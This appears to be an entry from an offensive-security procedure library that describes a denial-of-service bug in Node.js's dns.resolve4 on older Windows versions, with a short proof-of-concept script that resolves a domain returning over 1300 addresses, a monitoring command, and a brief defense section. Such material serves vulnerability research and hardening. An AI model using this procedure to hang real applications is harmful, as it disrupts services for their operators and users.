---
id: proc-nodejs-dns-dos-trigger-1033107
tags:
  - dos
  - node-js
  - dns
  - resource-consumption
type: procedure
tools:
  - '[[tools/Node.js]]'
tactics:
  - '[[Impact]]'
commands:
  - '[[commands/node-dns-resolve4-ticbrasil]]'
verified: false
platforms:
  - Node.js
  - Windows
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[Endpoint Denial of Service]]'
  - '[[OS Exhaustion Flood]]'
updated_at: '2025-12-14T17:26:30.826Z'
skill_level: intermediate
impact_level: high
detection_risk: low
sub_techniques:
  - '[[OS Exhaustion Flood]]'
validated: true
mitre_tactics:
  - '[[Impact]]'
mitre_techniques:
  - '[[Endpoint Denial of Service]]'
  - '[[OS Exhaustion Flood]]'
---
# Trigger Node.js DNS DoS with Large Response Domain

## Summary

This procedure exploits a vulnerability in the Node.js DNS module by resolving a domain with over 1300 A records, causing uncontrolled resource consumption that leads to application hang or freeze, enabling a high-severity remote DoS attack.

## Description

The Node.js dns.resolve4 function fails to handle domains returning excessive DNS responses efficiently, resulting in resource exhaustion. An attacker can trigger this by controlling input to DNS resolution calls in the application, such as user-supplied domains. The target domain 'ticbrasil.com.br' is used to reproduce the issue, as it returns more than 1300 IPv4 addresses. This affects Node.js versions like v12.18.4 and v14.15.0 on Windows, leading to service disruption without authentication. Prerequisites include access to execute Node.js code or influence DNS lookups in a running application.

## Requirements

1. Node.js runtime installed (affected versions: v12.18.4, v14.15.0)
2. Network access to resolve external DNS queries
3. Windows environment for reproduction
4. No special credentials needed if DNS resolution is exposed

## Defense

Defensive measures and detection strategies:

- Implement timeouts and limits on DNS resolution operations in Node.js applications
- Use alternative DNS resolvers or libraries with better resource handling (e.g., dns.promises with max retries)
- Monitor for excessive CPU/memory usage during DNS lookups and log anomalous resolutions
- Validate and sanitize user inputs that trigger DNS resolutions to prevent abuse of large-response domains

## Objectives

1. Trigger resource exhaustion in Node.js DNS module to cause DoS
2. Disrupt service availability remotely
3. Demonstrate vulnerability impact on application performance

## Instructions

### Step 1: Prepare and Execute DNS Resolution

**Context**: Create a simple Node.js script to call dns.resolve4 on the vulnerable domain, which will hang due to excessive responses.

**Command** ([[commands/node-dns-resolve4-ticbrasil]]):
```javascript
var dns = require('dns');
dns.resolve4('ticbrasil.com.br', function (err, addresses, family) {
  console.log(err);
  console.log(addresses);
  console.log(family);
});
```

> This command requires the 'dns' module and targets 'ticbrasil.com.br'. Expected output is a hang or no response; normally, it should log an array of over 1300 IPv4 addresses (reference: https://pastebin.com/Tv53Na89). Run via `node script.js` to observe the freeze.

### Step 2: Monitor Resource Consumption

**Context**: Observe the effects of the resolution to confirm DoS.

**Command** (Use system monitoring tools like Task Manager on Windows):
```bash
tasklist /fi "imagename eq node.exe" /fo table
```

> Monitor for high CPU and memory usage in the Node.js process. Success is indicated by process unresponsiveness and resource spikes.

## MITRE ATT&CK Mapping

### Tactics

- [[Impact]] Impact

### Techniques

- [[Endpoint Denial of Service]] Endpoint Denial of Service

### Sub-Techniques

- [[OS Exhaustion Flood]] OS Exhaustion Floods

## Commands Used

- [[commands/node-dns-resolve4-ticbrasil]]

## Tools Used

- [[tools/Node.js]]

## Tags

- dos
- node-js
- dns
- resource-consumption
